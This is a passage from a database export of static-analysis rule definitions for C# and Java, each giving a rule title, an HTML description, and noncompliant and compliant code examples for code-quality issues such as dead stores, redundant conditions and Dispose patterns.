66	Related "if/else if" statements should not have the same condition	S1862	\N	csharpsquid	<p>\nA chain of <code>if</code>/<code>else if</code> statements is evaluated from top to bottom. At most, only one branch will be executed: the first one with a condition that evaluates to <code>true</code>.\nTherefore, duplicating a condition automatically leads to dead code. Usually, this is due to a copy/paste error. At best, it's simply dead code and at worst, it's a bug that is likely to induce\nfurther bugs as the code is maintained, and obviously it could lead to unexpected behavior.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (param == 1)\n  openWindow();\nelse if (param == 2)\n  closeWindow();\nelse if (param == 1)  // Noncompliant\n  moveWindowToTheBackground();\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nif (param == 1)\n  openWindow();\nelse if (param == 2)\n  closeWindow();\nelse if (param == 3)\n  moveWindowToTheBackground();\n</pre>\n\n<h2>See</h2>\n\n<ul>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C</a> - Detect and remove code that has no effect</li>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/SIIyAQ">CERT, MSC12-CPP</a> - Detect and remove code that has no effect</li>\n</ul>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	cert,pitfall,unused	f	HTML	1511453806324	1511453806325	2
67	Classes should "Dispose" of members from the classes' own "Dispose" methods	S2952	\N	csharpsquid	<p>\n    It is possible in an <code>IDisposable</code> to call <code>Dispose</code> on class members from any method, but the\n    contract of <code>Dispose</code> is that it will clean up all unmanaged resources. Move disposing of members to some\n    other method, and you risk resource leaks.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class ResourceHolder : IDisposable\n{\n  private FileStream fs;\n  public void OpenResource(string path)\n  {\n    this.fs = new FileStream(path, FileMode.Open);\n  }\n  public void CloseResource()\n  {\n    this.fs.Close();\n  }\n\n  public void CleanUp()\n  {\n    this.fs.Dispose(); // Noncompliant; Dispose not called in class' Dispose method\n  }\n\n  public void Dispose()\n  {\n    // method added to satisfy demands of interface\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class ResourceHolder : IDisposable\n{\n  private FileStream fs;\n  public void OpenResource(string path)\n  {\n    this.fs = new FileStream(path, FileMode.Open);\n  }\n  public void CloseResource()\n  {\n    this.fs.Close();\n  }\n\n  public void Dispose()\n  {\n    this.fs.Dispose();\n  }\n}\n</pre>\n\n<h2>See</h2>\n<ul>\n    <li><a href="http://cwe.mitre.org/data/definitions/459.html">MITRE, CWE-459</a> - Incomplete Cleanup</li>\n</ul>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	cwe,denial-of-service	f	HTML	1511453806325	1511453806326	2
68	Classes directly extending "object" should not call "base" in "GetHashCode" or "Equals"	S3249	\N	csharpsquid	<p>\n    Making a <code>base</code> call in an overridden method is generally a good idea, but not in <code>GetHashCode</code> and\n    <code>Equals</code> for classes that directly extend <code>object</code> because those methods are based on the object reference.\n    Meaning that no two <code>objects</code> that use those <code>base</code> methods will ever be equal or have the same hash.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Point\n{\n  private readonly int x;\n  public MyClass(int x)\n  {\n    this.x = x;\n  }\n  public override int GetHashCode()\n  {\n    return x.GetHashCode() ^ base.GetHashCode(); //Noncompliant\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class Point\n{\n  private readonly int x;\n  public MyClass(int x)\n  {\n    this.x = x;\n  }\n  public override int GetHashCode()\n  {\n    return x.GetHashCode();\n  }\n}\n</pre>\n\n<h2>Exceptions</h2>\n<p>\n    This rule doesn't report on guard conditions checking for reference equality.\n</p>\n<pre>\npublic class Point\n{\n  public override bool Equals(object obj)\n  {\n    if (base.Equals(obj)) // Compliant, although it could be replaced with object.ReferenceEquals(obj, this), which is clearer\n    {\n      return true;\n    }\n    ...\n  }\n}\n</pre>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	\N	f	HTML	1511453806326	1511453806327	2
69	Unused method parameters should be removed	S1172	\N	csharpsquid	<p>\n    Unused parameters are misleading. Whatever the value passed to such parameters is, the behavior will be the same.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvoid DoSomething(int a, int b) // "b" is unused\n{\n  Compute(a);\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nvoid DoSomething(int a)\n{\n  Compute(a);\n}\n</pre>\n\n<h2>Exceptions</h2>\n<p>\n    <code>virtual</code>, <code>override</code> methods and interface implementations are ignored.\n</p>\n<pre>\noverride void DoSomething(int a, int b) // no issue reported on b\n{\n  Compute(a);\n}\n</pre>\n\n<p>\n    Furthermore, the <code>this</code> parameter of extension methods is also ignored.\n</p>\n<pre>\npublic static class Extensions\n{\n  public static void MyHelper(this HtmlHelper helper) //no issue reported here\n  {\n    // no use of helper here\n  }\n}\n</pre>\n\n<p>\n    Methods that have attributes defined on them are also ignored.\n</p>\n<pre>\npublic class MyDto\n{\n  public string Name { get; set; }\n\n  [OnDeserialized]\n  private void OnDeserialized(StreamingContext context)\n  {\n    // ...\n  }\n}\n</pre>\n\n<h2>See</h2>\n\n<ul>\n    <li>MISRA C++:2008, 0-1-11</li>\n    <li>MISRA C:2012, 2.7</li>\n</ul>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	misra,unused	f	HTML	1511453806328	1511453806328	1
70	Constructors should only call non-overridable methods	S1699	\N	csharpsquid	<p>\n    Calling an overridable method from a constructor could result in failures or strange behaviors when instantiating a subclass which overrides the method.\n</p>\n<p>\n    For example:\n</p>\n<ul>\n    <li>The subclass class constructor starts by calling the parent class constructor.</li>\n    <li>The parent class constructor calls the method, which has been overridden in the child class.</li>\n    <li>\n        If the behavior of the child class method depends on fields that are initialized in the child class constructor,\n        unexpected behavior (like a <code>NullReferenceException</code>) can result, because the fields aren't initialized yet.\n    </li>\n</ul>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Parent\n{\n  public Parent()\n  {\n    DoSomething();  // Noncompliant\n  }\n\n  public virtual void DoSomething() // can be overridden\n  {\n    ...\n  }\n}\n\npublic class Child : Parent\n{\n  private string foo;\n\n  public Child(string foo) // leads to call DoSomething() in Parent constructor which triggers a NullReferenceException as foo has not yet been initialized\n  {\n    this.foo = foo;\n  }\n\n  public override void DoSomething()\n  {\n    Console.WriteLine(this.foo.Length);\n  }\n}\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	pitfall	f	HTML	1511453806329	1511453806329	1
74	Child class members should not shadow parent class members	S2387	\N	csharpsquid	<p>\n    Having a variable with the same name in two unrelated classes is fine, but do the same thing within a class hierarchy\n    and you'll get confusion at best, chaos at worst. Perhaps even worse is the case where a child class field varies from\n    the name of a parent class only by case.\n</p>\n<p>\n    This rule ignores <code>private</code> parent class members, but in all other such cases, the child class field should\n    be renamed.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Fruit\n{\n  protected Season ripe;\n  protected Color flesh;\n\n  // ...\n}\n\npublic class Raspberry : Fruit\n{\n  private bool ripe;  // Noncompliant\n  private static Color FLESH; // Noncompliant\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class Fruit\n{\n  protected Season ripe;\n  protected Color flesh;\n\n  // ...\n}\n\npublic class Raspberry : Fruit\n{\n  private bool ripened;\n  private static Color FLESH_COLOR;\n}\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	confusing	f	HTML	1511453806333	1511453806333	1
71	Dead stores should be removed	S1854	\N	csharpsquid	<p>\n    A dead store happens when a local variable is assigned a value that is not read by any subsequent instruction.\n    Calculating or retrieving a value only to then overwrite it or throw it away, could indicate a serious error in\n    the code. Even if it's not an error, it is at best a waste of resources. Therefore all calculated values should be used.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvoid CalculateRate(int a, int b)\n{\n  int i;\n\n  i = a + b; // Noncompliant; calculation result not used before value is overwritten\n  i = DoSomething();  // Noncompliant; retrieved value not used\n  for (i = 0; i &lt; 10; i++)\n  {\n    //  ...\n  }\n  // ...\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nvoid CalculateRate(int a, int b)\n{\n  int i;\n\n  i = DoSomething();\n  i += a + b;\n  StoreI(i)\n\n  for (i = 0; i &lt; 10; i++)\n  {\n    //  ...\n  }\n}\n</pre>\n\n<h2>Exceptions</h2>\n<p>\n    No issue is reported on statements inside <code>try</code> blocks.\n</p>\n\n<h2>See</h2>\n\n<ul>\n    <li><a href="http://cwe.mitre.org/data/definitions/563.html">MITRE, CWE-563</a> - Assignment to Variable without Use ('Unused Variable')</li>\n    <li><a href="https://www.securecoding.cert.org/confluence/x/QYA5">CERT, MSC13-C</a> - Detect and remove unused values</li>\n    <li><a href="https://www.securecoding.cert.org/confluence/x/S4IyAQ">CERT, MSC13-CPP</a> - Detect and remove unused values</li>\n</ul>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	cert,cwe,suspicious,unused	f	HTML	1511453806330	1511453806331	1
72	"async" and "await" should not be used as identifiers	S2306	\N	csharpsquid	<p>\nSince C# 5.0, <code>async</code> and <code>await</code> are contextual keywords.\nContextual keywords do have a particular meaning in some contexts, but can still be used as variable names for example.\nKeywords, on the other hand, are always reserved, and therefore are not valid variable names.\nTo avoid any confusion though, it is best to not use <code>async</code> and <code>await</code> as identifiers.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nint await = 42; // Noncompliant\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nint someOtherName = 42;\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	pitfall	f	HTML	1511453806331	1511453806331	1
73	"ToString()" calls should not be redundant	S1858	\N	csharpsquid	<p>\n    Invoking a method designed to return a string representation of an object which is already a string is a waste of\n    keystrokes. Similarly, explicitly invoking <code>ToString()</code> when the compiler would do it implicitly is also\n    needless code-bloat.\n</p>\n<p>\n    This rule raises an issue when <code>ToString()</code> is invoked:\n    <ul>\n        <li>on a <code>string</code></li>\n        <li>on a non-<code>string</code> operand to concatenation</li>\n        <li>on an argument to <code>string.Format</code></li>\n    </ul>\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvar s = "foo";\nvar t = "fee fie foe " + s.ToString();  // Noncompliant\nvar u = "" + 1.ToString(); // Noncompliant\nvar v = string.Format("{0}", 1.ToString()); // Noncompliant\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nvar s = "foo";\nvar t = "fee fie foe " + s;\nvar u = "" + 1;\nvar v = string.Format("{0}", 1);\n</pre>	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	clumsy,finding	f	HTML	1511453806332	1511453806332	1
75	"GC.SuppressFinalize" should not be invoked for types without destructors	S3234	\N	csharpsquid	<p>\n    <code>GC.SuppressFinalize</code> asks the Common Language Runtime not to call the finalizer of an object. This is useful when\n    implementing the dispose pattern where object finalization is already handled in <code>IDisposable.Dispose</code>. However, it\n    has no effect if there is no finalizer defined in the object's type, so using it in such cases is just confusing.\n</p>\n<p>\n    This rule raises an issue when <code>GC.SuppressFinalize</code> is called for objects of <code>sealed</code> types without a finalizer.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nsealed class MyClass\n{\n  public void Method()\n  {\n    ...\n    GC.SuppressFinalize(this); //Noncompliant\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nsealed class MyClass\n{\n  public void Method()\n  {\n    ...\n  }\n}\n</pre>	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	confusing,unused	f	HTML	1511453806334	1511453806334	1
76	An abstract class should have both abstract and concrete methods	S1694	\N	csharpsquid	<p>\n    The purpose of an abstract class is to provide some heritable behaviors while also defining methods which must be\n    implemented by sub-classes.\n</p>\n<p>\n    A class with no abstract methods that was made abstract purely to prevent instantiation should be converted to a\n    concrete class (i.e. remove the <code>abstract</code> keyword) with a private constructor.\n</p>\n<p>\n    A class with only abstract methods and no inheritable behavior should be converted to an interface.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic abstract class Animal //Noncompliant; should be an interface\n{\n  abstract void Move();\n  abstract void Feed();\n}\n\npublic abstract class Color //Noncompliant; should be concrete with a private constructor\n{\n  private int red = 0;\n  private int green = 0;\n  private int blue = 0;\n\n  public int GetRed()\n  {\n    return red;\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic interface Animal\n{\n  void Move();\n  void Feed();\n}\n\npublic class Color\n{\n  private int red = 0;\n  private int green = 0;\n  private int blue = 0;\n\n  private Color()\n  {}\n\n  public int GetRed()\n  {\n    return red;\n  }\n}\n\npublic abstract class Lamp\n{\n  private bool switchLamp = false;\n\n  public abstract void Glow();\n\n  public void FlipSwitch()\n  {\n    switchLamp = !switchLamp;\n    if (switchLamp)\n    {\n      Glow();\n    }\n  }\n}\n</pre>	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	convention	f	HTML	1511453806335	1511453806336	1
77	Methods with caller info attributes should not be invoked with explicit arguments	S3236	\N	csharpsquid	<p>\n    Caller information attributes (<code>CallerFilePathAttribute</code>, <code>CallerLineNumberAttribute</code>, and\n    <code>CallerMemberNameAttribute</code>) provide a way to get information about the caller of a method through optional parameters.\n    But the arguments for these optional parameters are only generated if they are not explicitly defined in the call. Thus, specifying\n    the argument values defeats the purpose of the attributes.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvoid TraceMessage(string message,\n  [CallerMemberName] string memberName = "",\n  [CallerFilePath] string filePath = "",\n  [CallerLineNumber] int lineNumber = 0)\n{\n  /* ... */\n}\n\nvoid MyMethod()\n{\n  TraceMessage("my message", "MyMethod"); // Noncompliant\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nvoid TraceMessage(string message,\n  [CallerMemberName] string memberName = "",\n  [CallerFilePath] string filePath = "",\n  [CallerLineNumber] int lineNumber = 0)\n{\n  /* ... */\n}\n\nvoid MyMethod()\n{\n  TraceMessage("my message");\n}\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	suspicious	f	HTML	1511453806336	1511453806337	1
84	Trivial properties should be auto-implemented	S2292	\N	csharpsquid	<p>\n    Trivial properties, which include no logic but setting and getting a backing field should be converted to auto-implemented\n    properties, yielding cleaner and more readable code.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Car\n{\n  private string _make;\n  public string Make // Noncompliant\n  {\n    get { return _make; }\n    set { _make = value; }\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class Car\n{\n  public string Make { get; set; }\n}\n</pre>	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	clumsy	f	HTML	1511453806345	1511453806345	1
79	Short-circuit logic should be used to prevent null pointer dereferences in conditionals	S1697	\N	csharpsquid	<p>\nWhen either the equality operator in a null test or the logical operator that follows it is reversed, the code has the appearance of safely null-testing the object before dereferencing it.\nUnfortunately the effect is just the opposite - the object is null-tested and then dereferenced only if it is null, leading to a guaranteed null pointer dereference.\n</p>\n\n<h2>Noncompliant Code Sample</h2>\n<pre>\nif (str == null &amp;&amp; str.Length == 0)\n{\n  Console.WriteLine("String is empty");\n}\n\nif (str != null || str.Length > 0)\n{\n  Console.WriteLine("String is not empty");\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nif (str == null || str.Length == 0)\n{\n  Console.WriteLine("String is empty");\n}\n\nif (str != null &amp;&amp; str.Length > 0)\n{\n  Console.WriteLine("String is not empty");\n}\n</pre>	4	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	\N	f	HTML	1511453806338	1511453806339	2
80	"==" should not be used when "Equals" is overridden	S1698	\N	csharpsquid	<p>\n    Using the equality <code>==</code> and inequality <code>!=</code> operators to compare two objects generally works. The operators\n    can be overloaded, and therefore the comparison can resolve to the appropriate method. However, when the operators are used on\n    interface instances, then <code>==</code> resolves to reference equality, which may result in unexpected behavior if implementing\n    classes override <code>Equals</code>. Similarly, when a class overrides <code>Equals</code>, but instances are compared with\n    non-overloaded <code>==</code>, there is a high chance that value comparison was meant instead of the reference one.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic interface IMyInterface\n{\n}\n\npublic class MyClass : IMyInterface\n{\n    public override bool Equals(object obj)\n    {\n        //...\n    }\n}\n\npublic class Program\n{\n    public static void Method(IMyInterface instance1, IMyInterface instance2)\n    {\n        if (instance1 == instance2) // Noncompliant, will do reference equality check, but was that intended? MyClass overrides Equals.\n        {\n            Console.WriteLine("Equal");\n        }\n    }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic interface IMyInterface\n{\n}\n\npublic class MyClass : IMyInterface\n{\n    public override bool Equals(object obj)\n    {\n        //...\n    }\n}\n\npublic class Program\n{\n    public static void Method(IMyInterface instance1, IMyInterface instance2)\n    {\n        if (object.Equals(instance1, instance2)) // object.Equals checks for null and then calls the instance based Equals, so MyClass.Equals\n        {\n            Console.WriteLine("Equal");\n        }\n    }\n}\n</pre>\n\n<h2>Exceptions</h2>\n<p>\n    The rule does not report on comparisons of <code>System.Type</code> instances and on comparisons inside <code>Equals</code> overrides.\n</p>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	cert,cwe	f	HTML	1511453806340	1511453806340	1
81	"value" parameters should be used	S3237	\N	csharpsquid	<p>\n    In property and indexer <code>set</code> methods, and in event <code>add</code> and <code>remove</code> methods, the implicit\n    <code>value</code> parameter holds the value the accessor was called with. Not using the <code>value</code> means that the\n    accessor ignores the caller's intent which could cause unexpected results at runtime.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nprivate int count;\npublic int Count\n{\n  get { return count; }\n  set { count = 42; } // Noncompliant\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nprivate int count;\npublic int Count\n{\n  get { return count; }\n  set { count = value; }\n}\n</pre>\nor\n<pre>\npublic int Count\n{\n  get { return count; }\n  set { throw new InvalidOperationException(); }\n}\n</pre>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453806341	1511453806341	2
82	Overflow checking should not be disabled for "Enumerable.Sum"	S2291	\N	csharpsquid	<p>\n    <code>Enumerable.Sum()</code> always executes addition in a <code>checked</code> context, so an\n    <code>OverflowException</code> will be thrown if the value exceeds <code>MaxValue</code> even if an\n    <code>unchecked</code> context was specified. Using an <code>unchecked</code> context anyway represents\n    a misunderstanding of how <code>Sum</code> works.\n</p>\n<p>\n    This rule raises an issue when an <code>unchecked</code> context is specified for a <code>Sum</code> on\n    integer types.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvoid Add(List&lt;int&gt; list)\n{\n  int d = unchecked(list.Sum());  // Noncompliant\n\n  unchecked\n  {\n    int e = list.Sum();  // Noncompliant\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nvoid Add(List&lt;int&gt; list)\n{\n  int d = list.Sum();\n\n  try\n  {\n    int e = list.Sum();\n  }\n  catch (System.OverflowException e)\n  {\n    // exception handling...\n  }\n}\n</pre>\n\n<h2>Exceptions</h2>\n<p>\n    When the <code>Sum()</code> call is inside a <code>try-catch</code> block, no issues are reported.\n</p>\n\n<pre>\nvoid Add(List&lt;int&gt; list)\n{\n  unchecked\n  {\n    try\n    {\n      int e = list.Sum();\n    }\n    catch (System.OverflowException e)\n    {\n      // exception handling...\n    }\n  }\n}\n</pre>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	error-handling	f	HTML	1511453806342	1511453806343	3
83	Field-like events should not be virtual	S2290	\N	csharpsquid	<p>\n    Field-like events are events that do not have explicit <code>add</code> and <code>remove</code> methods. The compiler\n    generates a <code>private</code> <code>delegate</code> field to back the event, as well as generating the implicit\n    <code>add</code> and <code>remove</code> methods.\n</p>\n<p>\n    When a <code>virtual</code> field-like <code>event</code> is overridden by another field-like <code>event</code>,\n    the behavior of the C# compiler is to generate a new <code>private</code> <code>delegate</code> field in the derived\n    class, separate from the parent's field. This results in multiple and separate events being created, which is rarely\n    what's actually intended.\n</p>\n<p>\n    To prevent this, remove the <code>virtual</code> designation from the parent class event.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nabstract class Car\n{\n  public virtual event EventHandler OnRefueled; // Noncompliant\n\n  public void Refuel()\n  {\n    // This OnRefueld will always be null\n     if (OnRefueled != null)\n     {\n       OnRefueled(this, null);\n     }\n  }\n}\n\nclass R2 : Car\n{\n  public override event EventHandler OnRefueled;\n}\n\nclass Program\n{\n  static void Main(string[] args)\n  {\n    var r2 = new R2();\n    r2.OnRefueled += new EventHandler((o, a) =>\n    {\n      Console.WriteLine("This event will never be called");\n    });\n    r2.Refuel();\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nabstract class Car\n{\n  public event EventHandler OnRefueled; // Compliant\n\n  public void Refuel()\n  {\n    if (OnRefueled != null)\n    {\n      OnRefueled(this, null);\n    }\n  }\n}\n\nclass R2 : Car {}\n\nclass Program\n{\n  static void Main(string[] args)\n  {\n    var r2 = new R2();\n    r2.OnRefueled += new EventHandler((o, a) =>\n    {\n      Console.WriteLine("This event will be called");\n    });\n    r2.Refuel();\n  }\n}\n</pre>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	\N	f	HTML	1511453806344	1511453806344	2
693	Null should not be returned from a "Boolean" method	S2447	S2447	squid	<p>While <code>null</code> is technically a valid <code>Boolean</code> value, that fact, and the distinction between <code>Boolean</code> and <code>boolean</code> is easy to forget. So returning <code>null</code> from a <code>Boolean</code> method is likely to cause problems with callers' code.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic Boolean isUsable() {\n  // ...\n  return null;  // Noncompliant\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	pitfall	f	HTML	1511453807226	1511453807226	1
694	Utility classes should not have public constructors	S1118	S1118	squid	<p>\nUtility classes, which are a collection of static members, are not meant to be instantiated.\nEven abstract utility classes, which can be extended, should not have public constructors.\n</p>\n\n<p>\nJava adds an implicit public constructor to every class which does not define at least one explicitly.\nHence, at least one non-public constructor should be defined.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nclass StringUtils { // Noncompliant\n\n  public static String concatenate(String s1, String s2) {\n    return s1 + s2;\n  }\n\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\nclass StringUtils { // Compliant\n\n  private StringUtils() {\n  }\n\n  public static String concatenate(String s1, String s2) {\n    return s1 + s2;\n  }\n\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	design	f	HTML	1511453807227	1511453807227	1
85	Static fields should appear in the order they must be initialized	S3263	\N	csharpsquid	<p>\n    Static field initializers are executed in the order in which they appear in the class from top to bottom. Thus,\n    placing a static field in a class above the field or fields required for its initialization will yield unexpected\n    results.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass MyClass\n{\n  public static int X = Y; // Noncompliant; Y at this time is still assigned default(int), i.e. 0\n  public static int Y = 42;\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nclass MyClass\n{\n  public static int Y = 42;\n  public static int X = Y;\n}\n</pre>\nor\n<pre>\nclass MyClass\n{\n  public static int X;\n  public static int Y = 42;\n\n  static MyClass()\n  {\n    X = Y;\n  }\n}\n</pre>	4	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453806346	1511453806346	2
86	"params" should be used on overrides	S3262	\N	csharpsquid	<p>\n    Overriding methods automatically inherit the <code>params</code> behavior. To ease readability, this modifier should be explicitly used in\n    the overriding method as well.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass Base\n{\n  public virtual void Method(params int[] numbers)\n  {\n    ...\n  }\n}\nclass Derived : Base\n{\n  public override void Method(int[] numbers) // Noncompliant, the params is missing.\n  {\n    ...\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nclass Base\n{\n  public virtual void Method(params int[] numbers)\n  {\n    ...\n  }\n}\nclass Derived : Base\n{\n  public override void Method(params int[] numbers)\n  {\n    ...\n  }\n}\n</pre>	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	confusing	f	HTML	1511453806347	1511453806348	1
87	Unused local variables should be removed	S1481	\N	csharpsquid	<p>\nIf a local variable is declared but not used, it is dead code and should be removed. Doing so will improve maintainability because developers will not wonder what the variable is used for.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic int numberOfMinutes(int hours)\n{\n  int seconds = 0;   // seconds is never used\n  return hours * 60;\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic int numberOfMinutes(int hours)\n{\n  return hours * 60;\n}\n</pre>\n\n<h2>Exceptions</h2>\n<p>\n    Unused locally created resources in a <code>using</code> statement are not reported.\n</p>\n<pre>\nusing(var t = new Timer()) // t never used, but compliant.\n{\n  //...\n}\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	unused	f	HTML	1511453806348	1511453806349	1
88	Method overloads with default parameter values should not overlap	S3427	\N	csharpsquid	<p>\n    The rules for method resolution are complex and perhaps not properly understood by all coders. Having overloads with\n    optional parameter values make the matter even harder to understand. An overload with default parameter values can be\n    hidden by one without the optional parameters.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass\n{\n  void Print(string[] messages) {...}\n  void Print(string[] messages, string delimiter = "\\n") {...} // Noncompliant; default parameter value is hidden by overload\n}\n\n// ...\nMyClass myClass = new MyClass();\n\nmyClass.Print(new string[3] {"yes", "no", "maybe"});  // which version of Print will be called?\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	pitfall,unused	f	HTML	1511453806349	1511453806350	1
89	Method overrides should use the same default parameter values as the base methods	S1006	\N	csharpsquid	<p>\n    Default arguments are determined by the static type of the object. If a default argument is different for a parameter in an\n    overriding method, the value used in the call will be different when calls are made via the base or derived object, which may\n    be contrary to developer expectations.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Base\n{\n  public virtual void Write(int i = 42)\n  {\n    Console.WriteLine(i);\n  }\n}\n\npublic class Derived : Base\n{\n  public override void Write(int i = 5) // Noncompliant\n  {\n    Console.WriteLine(i);\n  }\n}\n\npublic class Program\n{\n  public static void Main()\n  {\n    var derived = new Derived();\n    derived.Write(); // writes 5\n    Print(derived);  // writes 42; was that expected?\n  }\n  private void Print(Base item)\n  {\n    item.Write();\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\npublic class Base\n{\n  public virtual void Write(int i = 42)\n  {\n    Console.WriteLine(i);\n  }\n}\n\npublic class Derived : Base\n{\n  public override void Write(int i = 42)\n  {\n    Console.WriteLine(i);\n  }\n}\n\npublic class Program\n{\n  public static void Main()\n  {\n    var derived = new Derived();\n    derived.Write(); // writes 42\n    Print(derived);  // writes 42\n  }\n  private void Print(Base item)\n  {\n    item.Write();\n  }\n}\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	misra,pitfall	f	HTML	1511453806350	1511453806351	1
90	Runtime type checking should be simplified	S2219	\N	csharpsquid	<p>\n    To check the type of an object there are several options:\n    <ul>\n        <li>\n            <code>expr is SomeType</code> or <code>expr.GetType() == typeof(SomeType)</code> if the\n            type is known at compile time,</li>\n        <li><code>typeInstance.IsInstanceOfType(expr)</code> if the type is calculated during runtime.</li>\n    </ul>\n</p>\n<p>\n    If runtime calculated <code>Type</code>s need to be compared:\n    <ul>\n        <li><code>typeInstance1.IsAssignableFrom(typeInstance2)</code>.</li>\n    </ul>\n</p>\n<p>\n    Depending on whether the type is returned by a <code>GetType()</code> or <code>typeof()</code> call, the <code>IsAssignableFrom()</code> and\n    <code>IsInstanceOfType()</code> might be simplified. Similarly, if the type is sealed, the type comparison with <code>==</code> can be converted\n    to an <code>is</code> call. Simplifying the calls also make <code>null</code> checking unnecessary because both <code>is</code> and\n    <code>IsInstanceOfType</code> performs it already.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass Fruit { }\nsealed class Apple : Fruit { }\n\nclass Program\n{\n  static void Main()\n  {\n    var apple = new Apple();\n    var b = apple != null &amp;&amp; apple.GetType() == typeof (Apple); // Noncompliant\n    b = typeof(Apple).IsInstanceOfType(apple); // Noncompliant\n    if (apple != null)\n    {\n      b = 